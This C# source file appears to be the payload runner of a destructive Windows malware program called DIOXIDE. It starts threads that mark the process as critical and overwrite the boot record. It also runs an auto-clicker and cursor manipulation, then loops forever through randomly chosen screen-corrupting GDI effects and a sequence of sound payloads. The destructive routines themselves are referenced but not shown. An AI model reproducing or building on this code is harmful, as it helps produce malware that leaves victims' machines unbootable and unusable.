using System;
using System.Threading;
using static DIOXIDE.payloads;
using static DIOXIDE.Functions;
using static DIOXIDE.Win32API;
using static DIOXIDE.main;
using static DIOXIDE.extra;

namespace DIOXIDE
{
    class run_payloads
    {
        public unsafe static void DStart()
        {
            CreateThreadStart( EnumGlobalWnd );
            CreateThreadStart( cursor_movement );

            destruction destruction = new destruction();

            CreateThreadStart( Clicker );
            CreateThreadStart( destruction.SetCriticalProcess );
            CreateThreadStart( destruction.OverwriteBoot );

            PStart();

            return;
        }
        public static void PStart()
        {
            CreateThreadStart( randGDIPayload_run );
            AudioPayload_run();
            return;
        }

        private static void randGDIPayload_run()
        {
            int True = 1;

            CreateThreadStart( CursorDraw );
            for ( ; ; )
            {
                Random rnad = new Random();

                int number = rnad.Next( 1, 27 );

                if (number == 1)
                {
                    CreateThreadStart( gdi1 );
                    Sleep( 20000 );
                    gdi1_cancel = True;
                }
                if (number == 2)
                {
                    CreateThreadStart( gdi2 );
                    Thread.Sleep( 20000 );
                    gdi2_cancel = True;
                }

                if (number == 3)
                {
                    CreateThreadStart( gdi3 );
                    Thread.Sleep( 20000 );
                    gdi3_cancel = True;
                }

                if (number == 4)
                {
                    CreateThreadStart( gdi2 );
                    CreateThreadStart( gdi3 );
                    Thread.Sleep( 20000 );
                    gdi2_cancel = True;
                    gdi3_cancel = True;
                }

                if (number == 5)
                {
                    CreateThreadStart( gdi4 );
                    Thread.Sleep( 20000 );
                    gdi4_cancel = True;
                }

                if (number == 6)
                {
                    CreateThreadStart( gdi5 );
                    Thread.Sleep( 20000 );
                    gdi5_cancel = True;
                }

                if (number == 7)
                {
                    CreateThreadStart( gdi6 );
                    CreateThreadStart( gdi7 );
                    Thread.Sleep( 20000 );
                    gdi6_cancel = True;
                    gdi7_cancel = True;
                }

                if (number == 8)
                {
                    CreateThreadStart( gdi8 );
                    Thread.Sleep( 20000 );
                    gdi8_cancel = True;
                }
                if (number == 9)
                {
                    CreateThreadStart( gdi9 );
                    Thread.Sleep( 20000 );
                    gdi9_cancel = True;
                }
                if (number == 10)
                {
                    CreateThreadStart( gdi10 );
                    Thread.Sleep( 20000 );
                    gdi10_cancel = True;
                }
                if (number == 11)
                {
                    CreateThreadStart( gdi11 );
                    Thread.Sleep( 20000 );
                    gdi11_cancel = True;
                }
                if (number == 12)
                {
                    CreateThreadStart( gdi12 );
                    Thread.Sleep( 20000 );
                    gdi12_cancel = True;
                }
                if (number == 13)
                {
                    CreateThreadStart( gdi13 );
                    Thread.Sleep( 20000 );
                    gdi13_cancel = True;
                }
                if (number == 14)
                {
                    CreateThreadStart( gdi14 );
                    Thread.Sleep( 20000 );
                    gdi14_cancel = True;
                }
                if (number == 15)
                {
                    CreateThreadStart( gdi15 );
                    Thread.Sleep( 20000 );
                    gdi15_cancel = True;
                }
                if (number == 16)
                {
                    CreateThreadStart( gdi16_1 );
                    CreateThreadStart( gdi16_2 );
                    CreateThreadStart( gdi16_3 );
                    CreateThreadStart( gdi16_4 );
                    Thread.Sleep( 20000 );
                    gdi16_1_cancel = True;
                    gdi16_2_cancel = True;
                    gdi16_3_cancel = True;
                    gdi16_4_cancel = True;
                }
                if (number == 17)
                {
                    CreateThreadStart( gdi17 );
                    Thread.Sleep( 20000 );
                    gdi17_cancel = True;
                }
                if (number == 18)
                {
                    CreateThreadStart( gdi18 );
                    Thread.Sleep( 20000 );
                    gdi18_cancel = True;
                }
                if (number == 19)
                {
                    CreateThreadStart( gdi19 );
                    Thread.Sleep( 20000 );
                    gdi19_cancel = True;
                }
                if (number == 20)
                {
                    CreateThreadStart( gdi20 );
                    Thread.Sleep( 20000 );
                    gdi20_cancel = True;
                }
                if (number == 21)
                {
                    CreateThreadStart( gdi21 );
                    Thread.Sleep( 20000 );
                    gdi21_cancel = True;
                }
                if (number == 22)
                {
                    CreateThreadStart( gdi22 );
                    Thread.Sleep( 20000 );
                    gdi22_cancel = True;
                }
                if (number == 23)
                {
                    CreateThreadStart( gdi23 );
                    Thread.Sleep( 20000 );
                    gdi23_cancel = True;
                }
                if (number == 24)
                {
                    CreateThreadStart( gdi24 );
                    Thread.Sleep( 20000 );
                    gdi24_cancel = True;
                }
                if (number == 25)
                {
                    CreateThreadStart( gdi25 );
                    Thread.Sleep( 20000 );
                    gdi25_cancel = True;
                }
                if (number == 26)
                {
                    CreateThreadStart( gdi26 );
                    Thread.Sleep( 20000 );
                    gdi26_cancel = True;
                }
                if (number == 27)
                {
                    CreateThreadStart( gdi27 );
                    Thread.Sleep( 20000 );
                    gdi27_cancel = True;
                }
            }
        }
        private static void AudioPayload_run()
        {
            Sound1();
            Sound2();
            Sound3();
            Sound4();
            Sound5();
            Sound6();
            Sound7();
            Sound8();
            Sound9();
            Sound10();
            Sound11();
            Sound12();
            Sound13();
            Sound14();
            Sound15();
            Sound16();
            Sound17();
            Sound18();
            Sound19();
            Sound20();
            Sound21();
            Sound22();
            FreezeSound();
            return;
        }
    }
}